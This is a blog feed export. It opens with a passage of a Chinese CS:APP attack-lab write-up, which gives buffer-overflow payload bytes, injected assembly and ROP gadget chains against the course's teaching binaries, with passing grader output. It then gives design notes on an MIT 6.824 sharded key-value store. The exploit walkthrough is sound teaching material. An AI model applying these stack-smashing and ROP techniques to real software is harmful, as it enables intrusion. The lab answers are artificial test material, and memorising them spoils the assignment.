<figure class="highlight bash"><table><tbody><tr><td class="code"><pre><span class="line">gdb ./ctarget <span class="comment"># 调试启动</span></span><br><span class="line"><span class="built_in">break</span> getbuf <span class="comment"># 打断点</span></span><br><span class="line">run -q <span class="comment"># 离线启动</span></span><br><span class="line">stepi <span class="comment"># 运行一步到 0x4017ac</span></span><br><span class="line"><span class="built_in">print</span> /x <span class="variable">$rsp</span> <span class="comment"># 十六进制打印栈地址</span></span><br></pre></td></tr></tbody></table></figure>
<p>可得，结果是 <code>0x5561dc78</code>。那么，就可以设计如下的攻击字节序列：</p>
<figure class="highlight plaintext"><table><tbody><tr><td class="code"><pre><span class="line">00 00 00 00 00 00 00 00</span><br><span class="line">00 00 00 00 00 00 00 00</span><br><span class="line">00 00 00 00 00 00 00 00</span><br><span class="line">00 00 00 00 00 00 00 00</span><br><span class="line">00 00 00 00 00 00 00 00</span><br><span class="line">c0 17 40 00 00 00 00 00</span><br></pre></td></tr></tbody></table></figure>
<p>在 5*8=40 个填充字节后，以小端逆序存放缓冲区地址。通过下面的命令验证结果，发现攻击成功。</p>
<figure class="highlight plaintext"><table><tbody><tr><td class="code"><pre><span class="line">./hex2raw &lt; ctarget.l1.txt | ./ctarget  -q                                                                                                                                                                                                                 </span><br><span class="line">Cookie: 0x59b997fa</span><br><span class="line">Type string:Touch1!: You called touch1()</span><br><span class="line">Valid solution for level 1 with target ctarget</span><br><span class="line">PASS: Would have posted the following:</span><br><span class="line">        user id bovik</span><br><span class="line">        course  15213-f15</span><br><span class="line">        lab     attacklab</span><br><span class="line">        result  1:PASS:0xffffffff:ctarget:1:00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 C0 17 40 00 00 00 00 00</span><br></pre></td></tr></tbody></table></figure>
<h3 id="phase-2">phase 2</h3>
<p>本节要求跳转到 <code>touch2</code> 函数（地址 0x4017ec），该函数需要传入 cookie 作为参数才能验证成功。因此，需要注入汇编代码，完成传参过程。可以写出如下的汇编代码。注意这里不能直接使用 <code>call</code> 指令，无法单独完成汇编过程。</p>
<figure class="highlight plaintext"><table><tbody><tr><td class="code"><pre><span class="line">movq $0x59b997fa,%rdi</span><br><span class="line">pushq $0x4017ec</span><br><span class="line">retq</span><br></pre></td></tr></tbody></table></figure>
<p>% rdi 是 x86 规范的存储第一个入参的寄存器，<code>pushq+retq</code> 联合完成跳转到 <code>touch2</code> 的过程。按如下命令得到对应的机器码：</p>
<figure class="highlight bash"><table><tbody><tr><td class="code"><pre><span class="line">gcc -c cl2.s</span><br><span class="line">objdump -d cl2.o &gt; cl2.d</span><br></pre></td></tr></tbody></table></figure>
<p>可以发现结果是</p>
<figure class="highlight plaintext"><table><tbody><tr><td class="code"><pre><span class="line"></span><br><span class="line">cl3.o:     file format elf64-x86-64</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">Disassembly of section .text:</span><br><span class="line"></span><br><span class="line">0000000000000000 &lt;.text&gt;:</span><br><span class="line">   0:	48 c7 c7 a8 dc 61 55 	mov    $0x5561dca8,%rdi</span><br><span class="line">   7:	68 fa 18 40 00       	pushq  $0x4018fa</span><br><span class="line">   c:	c3                   	retq   </span><br><span class="line"></span><br></pre></td></tr></tbody></table></figure>
<p>注意，大小端是对数值存储来说的，指令不需要做逆序处理。填充可以得到如下的结果：</p>
<figure class="highlight plaintext"><table><tbody><tr><td class="code"><pre><span class="line">48 c7 c7 fa 97 b9 59</span><br><span class="line">68 ec 17 40 00</span><br><span class="line">c3</span><br><span class="line">00 00 00</span><br><span class="line">00 00 00 00 00 00 00 00</span><br><span class="line">00 00 00 00 00 00 00 00</span><br><span class="line">00 00 00 00 00 00 00 00</span><br><span class="line">78 dc 61 55 00 00 00 00</span><br></pre></td></tr></tbody></table></figure>
<p>验证可以发现通过测试。</p>
<figure class="highlight plaintext"><table><tbody><tr><td class="code"><pre><span class="line">./hex2raw &lt; ctarget.l2.txt  | ./ctarget  -q                                                                                                                                                                                                                </span><br><span class="line">Cookie: 0x59b997fa</span><br><span class="line">Type string:Touch2!: You called touch2(0x59b997fa)</span><br><span class="line">Valid solution for level 2 with target ctarget</span><br><span class="line">PASS: Would have posted the following:</span><br><span class="line">        user id bovik</span><br><span class="line">        course  15213-f15</span><br><span class="line">        lab     attacklab</span><br><span class="line">        result  1:PASS:0xffffffff:ctarget:2:48 C7 C7 FA 97 B9 59 68 EC 17 40 00 C3 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 78 DC 61 55 00 00 00 00</span><br></pre></td></tr></tbody></table></figure>
<h3 id="phase-3">phase 3</h3>
<p>与 phase 2 类似，区别在于要传入 16 进制的 cookie 字符串作为参数，才能匹配。字符串存储在哪里呢？如果存储在 <code>getbuf</code> 函数的栈上（即缓冲区里），随着 <code>getbuf</code> 执行 <code>add    $0x28,%rsp</code>，栈空间会被释放，而 <code>touch3,hexmatch</code> 的新数据会覆盖这部分栈空间，导致数据被污染，因此，不能存储在这里。</p>
<p>所以，我们需要把字符串存储在不会被后续执行覆盖的位置，简单起见，可以存储在 <code>test</code> 函数的栈上，因为 <code>test</code> 函数一直没有返回，栈空间持续有效。接下来，构建 cookie 字符串，可以查 ascii 表逐字符地填写 16 进制 ascii 值，本文的 cookie 是 0x59b997fa，查表结果为 <code>35 39 62 39 39 37 66 61</code>。同样的，这里也不需要小端逆序。</p>
<p>接下来，编写汇编完成传参过程，字符串基址取决于存储的位置。</p>
<figure class="highlight plaintext"><table><tbody><tr><td class="code"><pre><span class="line">movq $0x5561dca8,%rdi # cookie字符串基址</span><br><span class="line">pushq $0x4018fa # touch3 地址</span><br><span class="line">retq</span><br></pre></td></tr></tbody></table></figure>
<p>可以构建出如下的攻击字节序列，<code>78 dc 61 55 00 00 00 00</code> 这一行是缓冲区基址，与前面类似。下一行存储了 cookie 字符串，地址可以由 0x5561dc78+0x28（缓冲区大小）+0x8（返回值大小）=0x5561dca8 计算得到。</p>
<figure class="highlight plaintext"><table><tbody><tr><td class="code"><pre><span class="line">48 c7 c7 a8 dc 61 55</span><br><span class="line">68 fa 18 40 00</span><br><span class="line">c3</span><br><span class="line">00 00 00</span><br><span class="line">00 00 00 00 00 00 00 00</span><br><span class="line">00 00 00 00 00 00 00 00</span><br><span class="line">00 00 00 00 00 00 00 00</span><br><span class="line">78 dc 61 55 00 00 00 00 </span><br><span class="line">35 39 62 39 39 37 66 61</span><br><span class="line">00 00 00 00 00 00 00 00</span><br></pre></td></tr></tbody></table></figure>
<p>验证可得，通过测试。</p>
<figure class="highlight plaintext"><table><tbody><tr><td class="code"><pre><span class="line">❯ ./hex2raw &lt; ctarget.l3.txt   | ./ctarget  -q                                                                                                                                                                                                               </span><br><span class="line">Cookie: 0x59b997fa</span><br><span class="line">Type string:Touch3!: You called touch3("59b997fa")</span><br><span class="line">Valid solution for level 3 with target ctarget</span><br><span class="line">PASS: Would have posted the following:</span><br><span class="line">        user id bovik</span><br><span class="line">        course  15213-f15</span><br><span class="line">        lab     attacklab</span><br><span class="line">        result  1:PASS:0xffffffff:ctarget:3:48 C7 C7 A8 DC 61 55 68 FA 18 40 00 C3 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 78 DC 61 55 00 00 00 00 35 39 62 39 39 37 66 61 00 00 00 00 00 00 00 00</span><br></pre></td></tr></tbody></table></figure>
<h2 id="rop">ROP</h2>
<p>这部分就启用了栈随机偏移和栈不可执行的系统防护，只能通过面向返回编程的角度进行攻击。</p>
<h3 id="phase-4">phase 4</h3>
<p>要实现 phase 2 的效果，提示可以用两个 gadget 实现。要完成目标，我们需要做以下步骤：</p>
<ol type="1">
<li>将 cookie 赋值给 % rdi</li>
<li> 跳转到 touch2</li>
</ol>
<p>其中，第 2 步只需要在栈里放置 touch2 的地址，等到上一个 gadget ret 时会自动完成跳转，不需要 gadget。步骤 1 中，由于 cookie 是自定义的，farm 中很难正好有一步到位的 gadget 可以将 cookie 赋给 % rdi（至少我这个 cookie 没有），因此需要拆分多个 gadget 实现。不难想到，可以先把 cookie 放在栈上，pop 到某个寄存器上，再 mov 给 % rdi，就可实现。</p>
<p>查看后文的表格，可以发现 0x58-0x5f 都是 popq 指令，从 start_farm 开始看汇编，发现 <code>addval_219</code> 满足要求：</p>
<figure class="highlight plaintext"><table><tbody><tr><td class="code"><pre><span class="line">00000000004019a7 &lt;addval_219&gt;:</span><br><span class="line">  4019a7:	8d 87 51 73 58 90    	lea    -0x6fa78caf(%rdi),%eax</span><br><span class="line">  4019ad:	c3 </span><br></pre></td></tr></tbody></table></figure>
<p>其中，90 是 nop 指令，无影响。我们就找到了 0x4019ab 的 gadget1，作用是 <code>popq %rax</code>。接下来，需要找 <code>movq %rax, %rdi</code> 的 gadget，查表可得指令为 <code>48 89 c7</code>，发现 <code>addval_273</code> 函数中满足要求：</p>
<figure class="highlight plaintext"><table><tbody><tr><td class="code"><pre><span class="line">00000000004019a0 &lt;addval_273&gt;:</span><br><span class="line">  4019a0:	8d 87 48 89 c7 c3    	lea    -0x3c3876b8(%rdi),%eax</span><br><span class="line">  4019a6:	c3    </span><br></pre></td></tr></tbody></table></figure>
<p>0x4019a2 的 gadget2，就可以完成上述 mov 操作。接下来，需要构造攻击字符串。这里需要关注指令在堆里的顺序，分析可得程序的行为应该是：</p>
<ol type="1">
<li><code>getbuf</code> 执行完毕，释放栈空间</li>
<li><code>retq</code> 跳转到 gadget1</li>
<li> 从栈上 pop 出 cookie</li>
<li><code>retq</code> 到 gadget2</li>
<li><code>movq</code></li>
<li><code>retq</code> 到 touch2</li>
</ol>
<p><code>getbuf</code> 之后的 <code>ret</code>，<code>pop</code> 均是以 <code>test</code> 的栈为基准的（因为 <code>getbuf</code> 的栈已经释放），所以后续指令都得覆盖在 <code>test</code> 栈上。进而可以构造出以下攻击序列：</p>
<figure class="highlight plaintext"><table><tbody><tr><td class="code"><pre><span class="line">00 00 00 00 00 00 00 00</span><br><span class="line">00 00 00 00 00 00 00 00</span><br><span class="line">00 00 00 00 00 00 00 00</span><br><span class="line">00 00 00 00 00 00 00 00</span><br><span class="line">00 00 00 00 00 00 00 00</span><br><span class="line">ab 19 40 00 00 00 00 00</span><br><span class="line">fa 97 b9 59 00 00 00 00</span><br><span class="line">a2 19 40 00 00 00 00 00</span><br><span class="line">ec 17 40 00 00 00 00 00</span><br></pre></td></tr></tbody></table></figure>
<p>填充 40 个空字节后，先跳转到 gadget1（第六行），栈指针移动到第七行，然后 <code>popq</code> 弹出 cookie，栈指针移动到第八行，跳转到 gadget2，移动到第九行，最后跳转到 touch2。最后进行运行验证：</p>
<figure class="highlight plaintext"><table><tbody><tr><td class="code"><pre><span class="line">Cookie: 0x59b997fa</span><br><span class="line">Type string:Touch2!: You called touch2(0x59b997fa)</span><br><span class="line">Valid solution for level 2 with target rtarget</span><br><span class="line">PASS: Would have posted the following:</span><br><span class="line">        user id bovik</span><br><span class="line">        course  15213-f15</span><br><span class="line">        lab     attacklab</span><br><span class="line">        result  1:PASS:0xffffffff:rtarget:2:00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 AB 19 40 00 00 00 00 00 FA 97 B9 59 00 00 00 00 A2 19 40 00 00 00 00 00 EC 17 40 00 00 00 00 00 </span><br></pre></td></tr></tbody></table></figure>
<h3 id="phase-5">phase 5</h3>
<p>这个 phase 要使用 rop 达到 phase 3 的效果，课程组刻意把这个 phase 做的很难，而且只占 5 分，留作奖励，官方解答用了 8 个 gadget。</p>
<p>不妨先从 farm 分析下有哪些指令可以使用（有效的 gadget），发现有：</p>
<figure class="highlight plaintext"><table><tbody><tr><td class="code"><pre><span class="line">movq %rax,%rdi # 48 89 c7  0x4019a2</span><br><span class="line">movq %rsp,%rax # 48 89 e0  0x401a06</span><br><span class="line">popq %rax      # 58        0x4019ab</span><br><span class="line"></span><br><span class="line">popq %rsp</span><br><span class="line">movl %eax,%edx # 5c 89 c2  0x4019dc</span><br><span class="line"></span><br><span class="line">movl %eax,%edi # 89 c7     0x4019a3</span><br><span class="line">movl %eax,%edx # 89 c2     0x4019dd</span><br><span class="line">movl %esp,%eax # 89 e0     0x401a07</span><br><span class="line">movl %ecx,%esi # 89 ce     0x401a13</span><br><span class="line">movl %edx,%ecx # 89 d1     0x401a34</span><br><span class="line"></span><br></pre></td></tr></tbody></table></figure>
<p>有代码意义的函数，只有一个加法函数 <code>add_xy</code>：</p>
<figure class="highlight plaintext"><table><tbody><tr><td class="code"><pre><span class="line">00000000004019d6 &lt;add_xy&gt;:</span><br><span class="line">  4019d6:	48 8d 04 37          	lea    (%rdi,%rsi,1),%rax</span><br><span class="line">  4019da:	c3   </span><br></pre></td></tr></tbody></table></figure>
<p><code>movl</code> 指令会把目标寄存器的高 4 字节置为 0。</p>
<p>乍一看好像有点尴尬。因为我们没有直接写入内存的指令，所以 cookie 字符串只能以缓冲区读入的方式写在栈上。而由于栈的随机偏移，也无法知晓固定的起始地址。但是换个角度，相对地址是可以控制的，可以通过 gadget 读取 % rsp 的值，并通过 add_xy 函数添加相对偏移，获取到字符串基址。按这个角度，核心要解决的问题有两个：</p>
<ol type="1">
<li>add_xy 怎么传参</li>
<li>相对偏移怎么确定</li>
</ol>
<p>add_xy 需要 % rdi，% rsi 两个参数，% rdi 存储栈帧，% rsi 存放相对偏移（因为只能向 % esi 赋值），数据来源均是 % rax。从上述 gadget 可以找出两条赋值路线：</p>
<ul>
<li>%rsp-&gt;%rax-&gt;%rdi</li>
<li>%rax-&gt;%edx-&gt;%ecx-&gt;%esi</li>
</ul>
<p>对应的汇编依次为：</p>
<figure class="highlight plaintext"><table><tbody><tr><td class="code"><pre><span class="line">movq %rsp,%rax # 48 89 e0  0x401a06 </span><br><span class="line">movq %rax,%rdi # 48 89 c7  0x4019a2</span><br><span class="line">popq %rax      # 58        0x4019ab 读取偏移值</span><br><span class="line">movl %eax,%edx # 89 c2     0x4019dd</span><br><span class="line">movl %edx,%ecx # 89 d1     0x401a34</span><br><span class="line">movl %ecx,%esi # 89 ce     0x401a13</span><br><span class="line"># add_xy 0x4019d6</span><br><span class="line">movq %rax,%rdi # 48 89 c7  0x4019a2</span><br><span class="line"># touch3 0x4018fa</span><br></pre></td></tr></tbody></table></figure>
<p>把 cookie 字符串放置在这些 gadget 之后，再计算相对偏移量就可以了。构造好的攻击序列如下：</p>
<figure class="highlight plaintext"><table><tbody><tr><td class="code"><pre><span class="line">00 00 00 00 00 00 00 00</span><br><span class="line">00 00 00 00 00 00 00 00</span><br><span class="line">00 00 00 00 00 00 00 00</span><br><span class="line">00 00 00 00 00 00 00 00</span><br><span class="line">00 00 00 00 00 00 00 00</span><br><span class="line">06 1a 40 00 00 00 00 00</span><br><span class="line">a2 19 40 00 00 00 00 00</span><br><span class="line">ab 19 40 00 00 00 00 00</span><br><span class="line">48 00 00 00 00 00 00 00</span><br><span class="line">dd 19 40 00 00 00 00 00</span><br><span class="line">34 1a 40 00 00 00 00 00</span><br><span class="line">13 1a 40 00 00 00 00 00</span><br><span class="line">d6 19 40 00 00 00 00 00</span><br><span class="line">a2 19 40 00 00 00 00 00</span><br><span class="line">fa 18 40 00 00 00 00 00 </span><br><span class="line">35 39 62 39 39 37 66 61</span><br><span class="line">00 00 00 00 00 00 00 00</span><br></pre></td></tr></tbody></table></figure>
<p>其中的偏移值为 0x48=72 字节，这是由于在第一个 gadget 内，% rsp 处在第 7 行，cookie 字符串存储在第 16 行，二者间差了 8*9=72 个字节。成功通过验证：</p>
<figure class="highlight plaintext"><table><tbody><tr><td class="code"><pre><span class="line">Cookie: 0x59b997fa</span><br><span class="line">Type string:Touch3!: You called touch3("59b997fa")</span><br><span class="line">Valid solution for level 3 with target rtarget</span><br><span class="line">PASS: Would have posted the following:</span><br><span class="line">        user id bovik</span><br><span class="line">        course  15213-f15</span><br><span class="line">        lab     attacklab</span><br><span class="line">        result  1:PASS:0xffffffff:rtarget:3:00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 06 1A 40 00 00 00 00 00 A2 19 40 00 00 00 00 00 AB 19 40 00 00 00 00 00 48 00 00 00 00 00 00 00 DD 19 40 00 00 00 00 00 34 1A 40 00 00 00 00 00 13 1A 40 00 00 00 00 00 D6 19 40 00 00 00 00 00 A2 19 40 00 00 00 00 00 FA 18 40 00 00 00 00 00 35 39 62 39 39 37 66 61 00 00 00 00 00 00 00 00</span><br></pre></td></tr></tbody></table></figure>
<h2 id="总结">总结</h2>
<p>这个 lab 做起来还是很有意思的。我第一次学完相关理论知识后，有点望而生畏，觉得难度很大。等有时间了，沉下心来，发现难度其实不大，循序渐进地做下来，还是很有成就感的。正如老师在课程里说的，"成功通过这个 lab，就打开了一扇黑暗的大门"。指导书里也提到，“我们已经成功绕过了两个现代化的阻止缓冲区溢出的手段”。通过这种理论知识和实践练习，可以深度理解缓冲区溢出的风险和规避措施，进而在日常编程中提高戒心。</p>
]]></content>
      <categories>
        <category>学习笔记</category>
        <category>体系结构</category>
        <category>csapp</category>
        <category>实验报告</category>
      </categories>
      <tags>
        <tag>学习笔记</tag>
        <tag>体系结构</tag>
        <tag>csapp</tag>
        <tag>实验报告</tag>
      </tags>
  </entry>
  <entry>
    <title>MIT-6.824 Lab4: 切片 KV 数据库</title>
    <url>/blog/2023/08/11/MIT-6-824-4/</url>
    <content><![CDATA[<h2 id="摘要">摘要</h2>
<p>本篇是 MIT 6.824 实验课程的最后一篇，实现一个高可用的、分片的 KV 数据库。分片能够有效解决单节点能承载的并发量问题，成倍地提升读写并发，但需要处理配置更新、切片迁移、删除等问题。</p>
<span id="more"></span>
<p>遵循课程规定，本文没有放出核心代码，只介绍了一些结构设计和流程思考，可放心食用。</p>
<h2 id="整体架构">整体架构</h2>
<p>下面是 ShardKV 的架构图，图片来源（<a href="https://zhuanlan.zhihu.com/p/464097239">mit-6.824 2021 Lab4：ShardKV - 知乎 (zhihu.com)</a>）。</p>
<p><img src="architecture.webp"></p>
<h3 id="shardctrler">ShardCtrler</h3>
<p>基于 Raft 构建的切片配置服务，client 可以通过 Join/Leave/Move/Query 四个 rpc，增查配置。默认有 10 个切片，根据 hash 取模得到 key 对应的切片。每个 config 由两部分组成，切片映射和多个复制组。每个复制组存储了一个切片子集的数据（一个切片的数据只会存储在一个复制组内），内部使用 Raft 实现高可用。切片映射用于将切片映射到复制组。从代码角度看，<code>Config</code> 结构体内包含：</p>
<figure class="highlight go"><table><tbody><tr><td class="code"><pre><span class="line"><span class="keyword">type</span> Config <span class="keyword">struct</span> {</span><br><span class="line">	Num    <span class="keyword">int</span>              <span class="comment">// config number</span></span><br><span class="line">	Shards [NShards]<span class="keyword">int</span>     <span class="comment">// shard -&gt; gid, shards[0]=1 表示 切片 0 的数据在 group 1 上</span></span><br><span class="line">	Groups <span class="keyword">map</span>[<span class="keyword">int</span>][]<span class="keyword">string</span> <span class="comment">// gid -&gt; servers[]</span></span><br><span class="line">}</span><br></pre></td></tr></tbody></table></figure>
<ul>
<li>Num：自增的配置编号</li>
<li> Shards：shard 和 gid 的对应关系，将切片映射到复制组</li>
<li> Groups：每个复制组拥有的 kv server</li>
</ul>
<h3 id="shardkv">ShardKV</h3>
<p>KV 存储的服务端，存储若干个切片的 KV 数据。需要周期性检测配置更新，进行配置更新、分片数据迁移、清理等工作。</p>
<p>客户端会依据最新的 shard 配置，发起 PUT/GET/APPEND 请求到 key 对应的服务端。</p>
<h2 id="思考">思考</h2>
<p>在盲目写代码之前，应该先理解背景和问题，思考需要做哪些事情、怎么做。</p>
<h3 id="shardctrler-的操作含义">ShardCtrler 的操作含义</h3>
<p><strong>复制组（Replica Group）是指一组用于 ShardKV 服务的，内部互为复制关系的服务器</strong>。刚开始看到这个词可能会觉得有点表意不清。一个复制组内可能会持有一个或多个切片的数据。ShardCtrler 向 client 暴露 4 种 rpc：</p>
<ul>
<li>Join：增加一个复制组用于 ShardKV 服务，即我们常说的扩容，需要进行<strong>负载均衡</strong></li>
<li> Leave：移除一个 ShardKV 复制组，即我们常说的缩容，需要进行<strong>负载均衡</strong></li>
<li> Move：将一个切片的数据移动到另一个复制组，这个主要是方便测试用的</li>
<li> Query：查询某个版本的配置状态</li>
</ul>
<p>前三种修改配置的操作，实际上是新增了一个配置。上面提到的负载均衡是指，<strong>将切片均匀地分散到复制组上，并尽可能少地转移数据</strong>。如何实现呢，其实也容易，每次让拥有最多分片的复制组，分一个给拥有最少分片的复制组，直到两者的分片数量差 &lt;=1 即可。</p>
<p>这里需要处理一些边界情况。例如初始时，所有切片都是在默认的无效组 0 上，新来一个复制组，就应该把所有切片都分给它，而不该把 0 当成一个有效的组，给它分 5 个。</p>
<h3 id="shardkv-配置更新意味着什么">ShardKV 配置更新意味着什么</h3>
<p>每次配置变动后，一个复制组可能会失去某些切片，获得一些切片，进而需要：</p>
<ul>
<li>新获得的切片：获取对应的切片数据</li>
<li>失去的切片：当新的复制组受理数据后，将切片数据删除</li>
</ul>
<h3 id="shardkv-由谁负责配置更新">ShardKV 由谁负责配置更新</h3>
<p>在一个复制组内，多个节点要利用 Raft 保证线性一致性。如果配置更新各自独立完成，一致性就会被打破，出现问题。因此，还是要利用 Raft，由 leader 节点发起配置更新并逐步地完成，follower 只需要被动提交日志即可。</p>
<h3 id="shardkv-检测配置更新流程">ShardKV 检测配置更新流程</h3>
<p>在 leader 侧，有一个后台线程，隔一段时间，例如 50-100ms 检查配置更新，这一点是毋庸置疑的。问题是检查哪个配置，最新的配置吗？</p>
<p>不不不，不可以。检查最新的配置可能会出现配置突变的情况，假设，目前的 config1，shard1 在 g100 上，发生了如下事情：</p>
<ol type="1">
<li>client 提交了 config2，shard1 被分给 g101</li>
<li>g101 获取到了 config2，<strong>希望从 g100 获得 shard1</strong></li>
<li>client 提交了 config3，shard1 又被分给了 g100</li>
<li>g100 获取到了 config3，<strong>觉得自己什么都不用做</strong></li>
</ol>
<p>这就出现了不一致的问题。因此正确答案是，<strong>复制组需要保存当前的配置，每次检查是否存在下一个版本的配置，进行更新</strong>。这样可以保证所有的节点按同样的顺序更新配置。</p>
<p>另一个问题是，leader 一次能够处理几个配置更新？这个也显然是 1 个，当 leader 处在配置更新中时，应该暂停检测更新。换而言之，检测到配置更新后，应该阻塞到配置更新完毕，再继续检测。</p>
<h3 id="shardkv-怎么进行切片转移">ShardKV 怎么进行切片转移</h3>
<p>常规来看，数据转移有两种模式：</p>
<ul>
<li>一种是拉（PULL），每个复制组去主动拉取自己需要的数组</li>
<li>一种是推（PUSH），每个复制组将其他复制组需要的切片数据推送给它们</li>
</ul>
<p>我个人认为拉的模式更好。考虑扩容的场景，新的复制组没有任何数据和用户请求，由它来主导发起数据请求，其他复制组被动回应，再好不过了。</p>
<h3 id="shardkv-拉取数据">ShardKV 拉取数据</h3>
<p>需要拉取哪些数据？基础的 KV 映射是必须的，但是还不够，还需要把请求的去重表也进行同步，否则，在收到历史消息后，可能会有重复执行的问题。</p>
<p>拉取数据时，配置不一致怎么办？不可以直接拉取，需要等到配置一致了才可以进行，否则会有问题。考虑下面的场景：</p>
<ol type="1">
<li>config1 时 x=1 在 g100</li>
<li> 发布 config2，x 在 g101</li>
<li>g101 检测到 config2，向 g100 拉取 x</li>
<li>g100 返回 x=1</li>
<li>g100 收到历史消息，<code>put x 2</code>，发现自己不在配置更新中，处理</li>
</ol>
<p>究其原因，配置不一致时，不同复制组对切片数据的行为可能是冲突的，使得历史消息的执行出现问题。</p>
<h3 id="shardkv-何时删除切片数据">ShardKV 何时删除切片数据</h3>
<p>正如之前讨论的，当新的复制组受理数据后，原复制组可以将可以将多的一部分数据删除。受理需要等待新的复制组 commit 数据，原来的数据才是彻底没用了，否则，可能由于节点下线等，需要重新请求、</p>
<p>因此，可以使用类似回调的模式，当新的复制组受理数据后，通知原复制组对原有数据进行删除。</p>
<h3 id="shardkv-新增的操作类型">ShardKV 新增的操作类型</h3>
<p>除了基础的 GET/PUT/APPEND，为了支持配置更新、切片迁移等的同步一致，需要设计新的操作，可以分为以下几类：</p>
<ul>
<li>配置更新开始的操作，通知整个复制组开始进行配置更新。复制组内必须对配置更新达成共识，这样 leader 下线后，其他节点才能继续更新工作。</li>
<li>切片数据的增删操作，当 leader 收到增删切片数据后，通知整个复制组。</li>
<li>配置更新的结束操作，通知复制组配置更新完成。</li>
</ul>
<p>这几步基本都是必须的，要考虑 leader 下线 / 其他节点成为 leader 的变动下，配置更新的状态不会丢失，必须把相关的操作使用 Raft 同步。</p>
<h3 id="shardkv-配置更新流程">ShardKV 配置更新流程</h3>
<ol type="1">
<li>后台线程检测到新配置，提交到 Raft，等待更新完成</li>
<li> server apply 新配置，<strong>将 server 标识为配置更新中</strong>，开启新的异步线程 t1 用以处理</li>
<li> t1 计算需要 pull 的切片，并发获取</li>
<li> t1 获取到的切片数据，提交给 Raft</li>
<li>t1 等到某个切片数据新增的操作 apply 后，发起删除数据的 rpc</li>
<li>t1 等到所有数据删除成功后</li>
<li> t1 将配置更新结束提交到 raft，等待执行</li>
<li> server apply 结束操作，<strong>将 server 标识为配置更新结束</strong></li>
</ol>
<p>在上述过程中，新的配置从 2 开始生效，server 开始根据最新的配置拒绝 <code>ErrWrongGroup</code> 的请求，对于 group 正确，但处在迁移中的数据，需要等到 8 之后才能受理，这时候可以返回给 client 一个等待信号，例如 <code>ErrWait</code>，让客户端等一会儿再重试，避免大量线程阻塞在 server 端。</p>
<p>在 challenge 里面，需要我们在 5 之后就开始处理对应切片的请求，达到快速响应的效果。</p>
<h3 id="删除切片数据是同步还是异步">删除切片数据是同步还是异步</h3>
<p>当然，同步是最好写的。但是同步会阻塞后续请求，不优雅。异步的话，<strong>需要重新设计</strong>，否则只有一个 <code>map[string]string</code> 作为数据库的情况下，异步也得加锁、找到切片对应的 <code>key</code>，删除，解锁，跟同步没有什么区别。</p>
<p>如果要异步的话，建议搞一个 <code>[]map[string]string</code>，slice 位置存对应 shard 的数据，要删除的时候，直接锁对应的 shard，删除即可。甚至也可以直接把 slice 对应位置设成 <code>nil</code>，等 go 的垃圾回收线程去回收，更优雅（笑</p>
<h2 id="operation">Operation</h2>
<p>GET/PUT/APPEND 就不说了</p>
<figure class="highlight go"><table><tbody><tr><td class="code"><pre><span class="line"><span class="keyword">type</span> ConfigureOp <span class="keyword">struct</span> {</span><br><span class="line">	Config shardctrler.Config</span><br><span class="line">}</span><br><span class="line"></span><br><span class="line"><span class="keyword">const</span> (</span><br><span class="line">	INSERT = <span class="number">1</span></span><br><span class="line">	DELETE = <span class="number">2</span></span><br><span class="line">	END    = <span class="number">3</span></span><br><span class="line">)</span><br><span class="line"></span><br><span class="line"><span class="keyword">type</span> ShardOp <span class="keyword">struct</span> {</span><br><span class="line">	Type      <span class="keyword">int8</span></span><br><span class="line">	Shard     <span class="keyword">int</span></span><br><span class="line">	ConfigNum <span class="keyword">int</span></span><br><span class="line">	Data      <span class="keyword">map</span>[<span class="keyword">string</span>]<span class="keyword">string</span></span><br><span class="line">	Seen      <span class="keyword">map</span>[<span class="keyword">int64</span>]<span class="keyword">int64</span></span><br><span class="line">}</span><br><span class="line"></span><br></pre></td></tr></tbody></table></figure>
<ul>
<li><code>ConfigureOp</code>：开始配置更新</li>
<li><code>ShardOp</code>：切片数据的 Insert、Delete 操作，简便起见把标识更新结束的 End 也加进来了</li>
</ul>
<h2 id="server">server</h2>
<figure class="highlight go"><table><tbody><tr><td class="code"><pre><span class="line"><span class="keyword">type</span> ShardKV <span class="keyword">struct</span> {</span><br><span class="line">	deadlock.Mutex</span><br><span class="line">	me           <span class="keyword">int</span></span><br><span class="line">	rf           *raft.Raft</span><br><span class="line">	applyCh      <span class="keyword">chan</span> raft.ApplyMsg</span><br><span class="line">	make_end     <span class="function"><span class="keyword">func</span><span class="params">(<span class="keyword">string</span>)</span> *<span class="title">labrpc</span>.<span class="title">ClientEnd</span></span></span><br><span class="line">	gid          <span class="keyword">int</span></span><br><span class="line">	ctrlers      []*labrpc.ClientEnd</span><br><span class="line">	maxraftstate <span class="keyword">int</span> <span class="comment">// snapshot if log grows this big</span></span><br><span class="line"></span><br><span class="line">	dead <span class="keyword">int32</span> <span class="comment">// set by Kill()</span></span><br><span class="line">	<span class="comment">// Your definitions here.</span></span><br><span class="line">	id <span class="keyword">string</span></span><br><span class="line">	<span class="comment">// 切片</span></span><br><span class="line">	mck           *shardctrler.Clerk</span><br><span class="line">	prevConfig    shardctrler.Config</span><br><span class="line">	currentConfig shardctrler.Config</span><br><span class="line">	deleteCond    *deadlock.Cond</span><br><span class="line">	<span class="comment">//</span></span><br><span class="line">	db   <span class="keyword">map</span>[<span class="keyword">string</span>]<span class="keyword">string</span></span><br><span class="line">	seen <span class="keyword">map</span>[<span class="keyword">int64</span>]<span class="keyword">int64</span></span><br><span class="line">	<span class="comment">// 维护提交状态</span></span><br><span class="line">	lastApplied <span class="keyword">int</span></span><br><span class="line">	applyCond   *deadlock.Cond</span><br><span class="line">	<span class="comment">// persistence</span></span><br><span class="line">	persister   *raft.Persister</span><br><span class="line">	maxRaftSize <span class="keyword">int</span></span><br><span class="line">	<span class="comment">// lab 4b 挑战, 准确地记录正在迁移中的切片, 即本该有的, 但还没获取到</span></span><br><span class="line">	inMigration <span class="keyword">map</span>[<span class="keyword">int</span>]<span class="keyword">bool</span></span><br><span class="line">}</span><br></pre></td></tr></tbody></table></figure>
